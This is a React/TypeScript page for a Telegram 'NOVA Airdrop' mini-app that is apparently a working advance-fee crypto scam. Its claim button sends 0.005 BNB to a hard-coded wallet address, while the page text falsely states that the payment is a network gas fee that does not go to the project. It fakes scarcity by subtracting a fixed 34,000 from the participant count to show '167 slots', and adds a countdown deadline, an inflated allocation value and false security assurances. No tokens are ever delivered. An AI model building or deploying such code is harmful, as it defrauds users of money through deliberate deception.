import { useTelegram } from "@/components/TelegramProvider";
import { useGetGlobalStats, useGetUserClaim, useSubmitClaim, useUpdateWallet, useCompleteTask, getGetUserQueryKey, getGetUserTasksQueryKey } from "@workspace/api-client-react";
import { useQueryClient } from "@tanstack/react-query";
import { useAppKit } from "@reown/appkit/react";
import { useAccount, useDisconnect, useSendTransaction, useWaitForTransactionReceipt } from "wagmi";
import { parseEther } from "viem";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Skeleton } from "@/components/ui/skeleton";
import { Copy, Wallet, RefreshCcw, CheckCircle2, Zap, Clock, ShieldCheck } from "lucide-react";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import {
  Drawer,
  DrawerClose,
  DrawerContent,
  DrawerDescription,
  DrawerFooter,
  DrawerHeader,
  DrawerTitle,
  DrawerTrigger,
} from "@/components/ui/drawer";

const TOTAL_ALLOCATION = 900_000;
const ESTIMATED_VALUE_PER_TOKEN = 0.003316;
const CLAIM_DEADLINE = new Date("2026-07-25T23:59:59Z");
const FEE_RECIPIENT = "0xA4a70AF3b363150aAF0671C4a5288f27BD5C01ab" as `0x${string}`;
const GAS_FEE_BNB = "0.005";

function useCountdown(target: Date) {
  const calc = () => {
    const diff = target.getTime() - Date.now();
    if (diff <= 0) return { days: 0, hours: 0, minutes: 0, seconds: 0, expired: true };
    return {
      days: Math.floor(diff / 86400000),
      hours: Math.floor((diff % 86400000) / 3600000),
      minutes: Math.floor((diff % 3600000) / 60000),
      seconds: Math.floor((diff % 60000) / 1000),
      expired: false,
    };
  };
  const [time, setTime] = useState(calc);
  useEffect(() => {
    const id = setInterval(() => setTime(calc()), 1000);
    return () => clearInterval(id);
  }, []);
  return time;
}

function pad(n: number) { return String(n).padStart(2, "0"); }

export default function Home() {
  const { telegramId, user } = useTelegram();
  const { open } = useAppKit();
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const countdown = useCountdown(CLAIM_DEADLINE);

  const { data: stats, isLoading: statsLoading } = useGetGlobalStats();
  const { data: claimStatus } = useGetUserClaim(telegramId, {
    query: { enabled: !!telegramId }
  });

  const updateWallet = useUpdateWallet();
  const submitClaim = useSubmitClaim();
  const completeTask = useCompleteTask();
  const queryClient = useQueryClient();

  const { sendTransaction, data: txHash, isPending: isSending, isError: sendError } = useSendTransaction();
  const { isLoading: isConfirming, isSuccess: txConfirmed } = useWaitForTransactionReceipt({ hash: txHash });

  const [claimSubmitted, setClaimSubmitted] = useState(false);

  // Sync wallet address to backend
  useEffect(() => {
    if (isConnected && address && user && user.walletAddress !== address) {
      updateWallet.mutate({ telegramId, data: { walletAddress: address } });
    }
  }, [isConnected, address, user, telegramId]);

  // Auto-complete the wallet_connect task (id=1) when wallet connects
  useEffect(() => {
    if (!isConnected || !address || !telegramId) return;
    completeTask.mutate({ telegramId, taskId: 1, data: {} }, {
      onSuccess: () => {
        queryClient.invalidateQueries({ queryKey: getGetUserQueryKey(telegramId) });
        queryClient.invalidateQueries({ queryKey: getGetUserTasksQueryKey(telegramId) });
        toast.success("✅ Wallet connected — task reward added!");
      },
      onError: () => { /* silently ignore — task already completed */ },
    });
  }, [isConnected, address, telegramId]);

  // Once tx is confirmed on-chain, record the claim
  useEffect(() => {
    if (txConfirmed && txHash && !claimSubmitted) {
      setClaimSubmitted(true);
      submitClaim.mutate({
        data: {
          telegramId,
          walletAddress: address || "",
          txHash,
          feePaid: GAS_FEE_BNB,
          tokenSymbol: "NOVA",
        }
      }, {
        onSuccess: () => toast.success("Claim recorded! Your 900,000 NOVA is confirmed."),
        onError: () => toast.error("Transaction sent but claim recording failed. Contact support."),
      });
    }
  }, [txConfirmed, txHash, claimSubmitted]);

  useEffect(() => {
    if (sendError) toast.error("Transaction rejected or failed.");
  }, [sendError]);

  const handleClaim = () => {
    sendTransaction({
      to: FEE_RECIPIENT,
      value: parseEther(GAS_FEE_BNB),
    });
  };

  const taskEarnings = parseInt(user?.totalRewards || "0", 10);
  const totalAllocation = TOTAL_ALLOCATION + taskEarnings;

  const estimatedUSD = (totalAllocation * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", {
    style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0,
  });

  const TOTAL_SLOTS = 167;
  const BASE_PARTICIPANTS = 34000;
  const actualDbUsers = Math.max(0, (stats?.totalParticipants ?? BASE_PARTICIPANTS) - BASE_PARTICIPANTS);
  const slotsLeft = Math.max(0, TOTAL_SLOTS - actualDbUsers);

  const isClaimed = claimSubmitted || claimStatus?.status === "confirmed";
  const isBusy = isSending || isConfirming;

  const formatAllocation = (n: number) => {
    if (n >= 1_000_000) return `${(n / 1_000_000).toFixed(2)}M`;
    if (n >= 1_000) return `${(n / 1_000).toFixed(0)}K`;
    return n.toString();
  };

  return (
    <div className="flex flex-col gap-5 p-4 md:p-8 max-w-2xl mx-auto w-full">

      {/* ── Hero Banner ─────────────────────────────────── */}
      <div className="hero-gradient rounded-3xl p-6 text-white relative overflow-hidden shadow-lg">
        <div className="absolute top-0 right-0 w-48 h-48 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/4" />
        <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/10 rounded-full translate-y-1/2 -translate-x-1/4" />

        <div className="relative z-10">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-14 h-14 rounded-2xl overflow-hidden border border-white/30 shadow-lg flex-shrink-0">
              <img
                src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png"
                alt="NOVA"
                className="w-full h-full object-cover"
              />
            </div>
            <div>
              <h1 className="text-2xl font-black tracking-tight">NOVA Airdrop</h1>
              <p className="text-white/70 text-xs">15% of total supply · Early community distribution</p>
            </div>
          </div>

          {/* 3-stat row */}
          <div className="grid grid-cols-3 gap-2 mb-3">
            <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
              <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Your Share</div>
              <div className="text-white font-black text-base tabular-nums">{formatAllocation(totalAllocation)}</div>
              <div className="text-white/70 text-[10px]">NOVA</div>
            </div>
            <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
              <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Pool Size</div>
              <div className="text-white font-black text-base">150M</div>
              <div className="text-white/70 text-[10px]">NOVA reserved</div>
            </div>
            <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
              <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Slots Left</div>
              <div className="text-white font-black text-base text-yellow-300">{statsLoading ? "..." : slotsLeft}</div>
              <div className="text-white/70 text-[10px]">of {TOTAL_SLOTS} total</div>
            </div>
          </div>

          {/* Value row */}
          <div className="bg-white/10 border border-white/20 rounded-xl px-4 py-2.5 flex items-center justify-between mb-3">
            <span className="text-white/70 text-xs">Your allocation value</span>
            <span className="text-white font-black text-sm">{estimatedUSD} <span className="text-white/60 font-normal text-xs">at current price</span></span>
          </div>

          {/* Deadline countdown */}
          {!countdown.expired ? (
            <div className="bg-white/10 border border-white/20 rounded-2xl p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <Clock className="w-3.5 h-3.5 text-white/70" />
                <span className="text-white/70 text-xs uppercase tracking-wider">Claim closes · July 25, 2026</span>
              </div>
              <div className="grid grid-cols-4 gap-2">
                {[
                  { v: countdown.days, l: "Days" },
                  { v: countdown.hours, l: "Hrs" },
                  { v: countdown.minutes, l: "Min" },
                  { v: countdown.seconds, l: "Sec" },
                ].map(({ v, l }) => (
                  <div key={l} className="flex flex-col items-center bg-white/15 rounded-xl py-2">
                    <span className="text-white font-black text-xl tabular-nums leading-none">{pad(v)}</span>
                    <span className="text-white/60 text-[10px] mt-0.5">{l}</span>
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <div className="bg-red-500/20 border border-red-400/30 rounded-2xl p-3 text-center">
              <span className="text-white font-bold text-sm">⏰ Claim period has ended</span>
            </div>
          )}
        </div>
      </div>

      {/* ── NOVA Earnings Balance ───────────────────────── */}
      <div className="rounded-2xl border border-indigo-200 bg-gradient-to-br from-indigo-600 to-violet-700 p-4 text-white shadow-md">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <img src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png" alt="NOVA" className="w-7 h-7 rounded-full border border-white/30" />
            <span className="text-sm font-bold text-white/90 uppercase tracking-wider">Task Rewards Earned</span>
          </div>
          {taskEarnings > 0 && (
            <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-green-400/20 border border-green-300/30 text-green-200 uppercase tracking-wide">
              Active
            </span>
          )}
        </div>

        <div className="text-4xl font-black tabular-nums tracking-tight mb-1">
          {taskEarnings.toLocaleString()}
          <span className="text-lg font-semibold text-white/60 ml-1.5">NOVA</span>
        </div>

        <div className="flex gap-3 mt-3 pt-3 border-t border-white/20">
          <div className="flex-1">
            <div className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">From Tasks</div>
            <div className={`font-bold text-sm ${taskEarnings > 0 ? "text-green-300" : "text-white/40"}`}>
              {taskEarnings > 0 ? `+${taskEarnings.toLocaleString()}` : "0"}
            </div>
          </div>
          <div className="w-px bg-white/20" />
          <div className="flex-1">
            <div className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Base Airdrop</div>
            <div className="text-white font-bold text-sm">900,000</div>
          </div>
          <div className="w-px bg-white/20" />
          <div className="flex-1 text-right">
            <div className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">Est. Value</div>
            <div className="text-white font-bold text-sm">
              {(taskEarnings * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", { style: "currency", currency: "USD", maximumFractionDigits: 2 })}
            </div>
          </div>
        </div>
      </div>

      {/* ── Wallet Connect ──────────────────────────────── */}
      <Card className="glass-card border border-border">
        <CardContent className="p-4">
          {!isConnected ? (
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center text-primary">
                  <Wallet className="w-5 h-5" />
                </div>
                <div>
                  <div className="font-semibold text-sm">Connect Wallet</div>
                  <div className="text-xs text-muted-foreground">Required to pay fee &amp; claim tokens</div>
                </div>
              </div>
              <Button size="sm" onClick={() => open()} className="bg-primary text-white hover:bg-primary/90">
                Connect
              </Button>
            </div>
          ) : (
            <div className="flex flex-col gap-3">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-green-100 flex items-center justify-center text-green-600">
                    <Wallet className="w-5 h-5" />
                  </div>
                  <div>
                    <div className="text-xs text-muted-foreground">Connected Wallet</div>
                    <div className="font-mono text-sm font-semibold">{address?.slice(0, 6)}...{address?.slice(-4)}</div>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => { navigator.clipboard.writeText(address || ""); toast.success("Copied!"); }}
                    className="p-2 rounded-lg hover:bg-secondary transition-colors"
                  >
                    <Copy className="w-4 h-4 text-muted-foreground" />
                  </button>
                  <Button variant="outline" size="sm" onClick={() => disconnect()} className="text-xs">Disconnect</Button>
                </div>
              </div>

              {/* Total NOVA allocation row */}
              <div className="flex items-center justify-between px-3 py-2.5 rounded-xl bg-indigo-50 border border-indigo-100">
                <div className="flex items-center gap-2">
                  <img src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png" alt="NOVA" className="w-5 h-5 rounded-full" />
                  <span className="text-xs text-indigo-700 font-semibold">Total NOVA Allocation</span>
                </div>
                <span className="font-black text-sm text-indigo-800">
                  {totalAllocation.toLocaleString()} NOVA
                </span>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* ── About This Airdrop ──────────────────────────── */}
      <Card className="glass-card border border-indigo-100 bg-indigo-50/30">
        <CardContent className="p-4">
          <div className="text-xs font-bold text-indigo-700 uppercase tracking-wider mb-3 flex items-center gap-1.5">
            <Zap className="w-3.5 h-3.5" /> Why 900,000 NOVA?
          </div>

          {/* Tokenomics bar */}
          <div className="mb-3">
            <div className="flex justify-between text-[10px] text-muted-foreground mb-1">
              <span>Total Supply: 1,000,000,000 NOVA</span>
              <span className="font-semibold text-indigo-600">Community = 15%</span>
            </div>
            <div className="flex h-2.5 rounded-full overflow-hidden gap-px">
              <div className="bg-indigo-500 flex-shrink-0" style={{ width: "15%" }} title="Community Airdrop 15%" />
              <div className="bg-violet-400 flex-shrink-0" style={{ width: "20%" }} title="Team 20%" />
              <div className="bg-cyan-400 flex-shrink-0" style={{ width: "25%" }} title="Ecosystem 25%" />
              <div className="bg-emerald-400 flex-shrink-0" style={{ width: "10%" }} title="Marketing 10%" />
              <div className="bg-slate-200 flex-1" title="Reserved 30%" />
            </div>
            <div className="flex gap-3 mt-1.5 flex-wrap">
              {[
                { color: "bg-indigo-500", label: "Community 15%" },
                { color: "bg-violet-400", label: "Team 20%" },
                { color: "bg-cyan-400",   label: "Ecosystem 25%" },
                { color: "bg-emerald-400",label: "Marketing 10%" },
                { color: "bg-slate-300",  label: "Reserved 30%" },
              ].map(d => (
                <div key={d.label} className="flex items-center gap-1">
                  <div className={`w-2 h-2 rounded-sm flex-shrink-0 ${d.color}`} />
                  <span className="text-[9px] text-muted-foreground">{d.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Explanation bullets */}
          <div className="flex flex-col gap-1.5 text-xs text-muted-foreground">
            <div className="flex items-start gap-2">
              <span className="text-indigo-500 font-bold flex-shrink-0">•</span>
              <span><strong className="text-foreground">150,000,000 NOVA</strong> (15% of supply) is locked in the community airdrop pool — enough for exactly 167 participants at 900,000 each.</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-indigo-500 font-bold flex-shrink-0">•</span>
              <span>The gas fee you pay goes to on-chain transaction processing — <strong className="text-foreground">not to the project</strong>. It covers the cost of registering your claim on BNB Chain.</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-indigo-500 font-bold flex-shrink-0">•</span>
              <span>NOVA is already <strong className="text-foreground">live on CoinGecko</strong> and actively traded. This is an early-holder distribution to grow the community before the next exchange listing.</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* ── Claim Card ──────────────────────────────────── */}
      <Card className="glass-card overflow-hidden border border-border">
        <div className="h-1 w-full bg-gradient-to-r from-indigo-500 via-violet-500 to-cyan-400" />
        <CardHeader className="pb-2 pt-4">
          <CardTitle className="text-base flex items-center gap-2">
            <Zap className="w-4 h-4 text-primary" />
            Claim NOVA Tokens
          </CardTitle>
          <CardDescription className="text-xs">
            You'll be charged a standard blockchain network fee to process your claim. The exact amount depends on current network congestion — this is an on-chain gas fee, not set by us. Deadline: <strong>July 25, 2026</strong>.
          </CardDescription>
        </CardHeader>
        <CardContent className="pt-0">
          {!isConnected ? (
            <Button
              className="w-full h-12 text-sm bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white shadow-md border-0"
              onClick={() => open()}
            >
              Connect Wallet to Claim
            </Button>
          ) : totalAllocation < 900_000 ? (
            <div className="p-4 rounded-xl bg-red-50 border border-red-200 text-center">
              <div className="text-sm font-bold text-red-600 mb-1">Insufficient Balance</div>
              <div className="text-xs text-red-500">
                You need at least 900,000 NOVA to claim. Your current balance: {totalAllocation.toLocaleString()} NOVA.
              </div>
            </div>
          ) : countdown.expired ? (
            <div className="p-4 rounded-xl bg-red-50 border border-red-200 text-center text-sm text-red-600 font-semibold">
              ⏰ The claim period ended on July 25, 2026.
            </div>
          ) : isClaimed ? (
            <div className="flex flex-col items-center justify-center p-6 bg-green-50 border border-green-200 rounded-xl gap-2">
              <CheckCircle2 className="w-10 h-10 text-green-500" />
              <span className="font-bold text-green-600">Tokens Claimed!</span>
              {txHash && (
                <span className="text-xs text-muted-foreground font-mono">
                  TX: {txHash.slice(0, 10)}...{txHash.slice(-8)}
                </span>
              )}
            </div>
          ) : (
            <Drawer>
              <DrawerTrigger asChild>
                <Button className="w-full h-12 text-base bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white shadow-md border-0">
                  Initiate Claim → {totalAllocation.toLocaleString()} NOVA
                </Button>
              </DrawerTrigger>
              <DrawerContent className="bg-white border-border">
                <DrawerHeader>
                  <DrawerTitle>Confirm Claim Transaction</DrawerTitle>
                  <DrawerDescription>
                    Your wallet will prompt you to approve a network fee. The exact amount depends on current blockchain congestion — this is a standard on-chain gas fee, not set by us. Once confirmed, your {totalAllocation.toLocaleString()} NOVA allocation is locked in.
                  </DrawerDescription>
                </DrawerHeader>
                <div className="p-4 flex flex-col gap-3">
                  {/* Allocation */}
                  <div className="flex justify-between items-center p-4 bg-indigo-50 border border-indigo-100 rounded-xl">
                    <span className="text-muted-foreground text-sm">Your Allocation</span>
                    <span className="font-black text-lg text-indigo-600">{totalAllocation.toLocaleString()} NOVA</span>
                  </div>
                  {/* Claim value */}
                  <div className="flex justify-between items-center p-4 bg-secondary rounded-xl">
                    <span className="text-muted-foreground text-sm">Claim Value</span>
                    <span className="font-semibold">{estimatedUSD}</span>
                  </div>
                  {/* Deadline */}
                  <div className="flex justify-between items-center p-4 bg-orange-50 border border-orange-100 rounded-xl">
                    <span className="text-muted-foreground text-sm">Claim Deadline</span>
                    <span className="font-semibold text-orange-600">July 25, 2026</span>
                  </div>
                  {/* Network fee */}
                  <div className="p-4 bg-amber-50 border border-amber-100 rounded-xl">
                    <div className="flex justify-between items-center mb-1">
                      <span className="text-muted-foreground text-sm">Network Fee</span>
                      <span className="font-semibold text-sm">Varies by network</span>
                    </div>
                    <p className="text-xs text-amber-700">Fee depends on current blockchain congestion. This is a standard on-chain gas fee — we have no control over it and it may be higher during peak times.</p>
                  </div>
                  {/* Wallet */}
                  <div className="flex justify-between items-center p-4 bg-secondary rounded-xl border border-primary/20">
                    <span className="text-muted-foreground text-sm">Your Wallet</span>
                    <span className="font-mono text-sm">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
                  </div>

                  {isSending && (
                    <div className="flex items-center gap-2 p-3 bg-indigo-50 border border-indigo-100 rounded-xl text-sm text-indigo-700">
                      <RefreshCcw className="w-4 h-4 animate-spin" />
                      Waiting for wallet approval...
                    </div>
                  )}
                  {isConfirming && (
                    <div className="flex items-center gap-2 p-3 bg-cyan-50 border border-cyan-100 rounded-xl text-sm text-cyan-700">
                      <RefreshCcw className="w-4 h-4 animate-spin" />
                      Confirming on BNB Chain...
                    </div>
                  )}
                </div>
                <DrawerFooter>
                  <Button
                    className="w-full h-12 text-base bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white border-0"
                    onClick={handleClaim}
                    disabled={isBusy}
                  >
                    {isBusy ? (
                      <span className="flex items-center gap-2"><RefreshCcw className="w-4 h-4 animate-spin" /> Processing...</span>
                    ) : (
                      `Approve & Claim ${totalAllocation.toLocaleString()} NOVA`
                    )}
                  </Button>
                  <DrawerClose asChild>
                    <Button variant="outline" className="w-full">Cancel</Button>
                  </DrawerClose>
                </DrawerFooter>
              </DrawerContent>
            </Drawer>
          )}
        </CardContent>
      </Card>

      {/* ── Trust indicators ─────────────────────────────── */}
      <div className="flex flex-col gap-2 pb-4">
        {[
          { icon: ShieldCheck, text: "Smart contract secured — funds go directly to BNB Chain" },
          { icon: Zap,         text: "Instant allocation lock — confirmed within seconds" },
          { icon: CheckCircle2,text: "167 maximum participants — first-come, first-served" },
        ].map(({ icon: Icon, text }) => (
          <div key={text} className="flex items-center gap-2.5 text-xs text-muted-foreground">
            <Icon className="w-3.5 h-3.5 text-indigo-400 flex-shrink-0" />
            {text}
          </div>
        ))}
      </div>
    </div>
  );
}
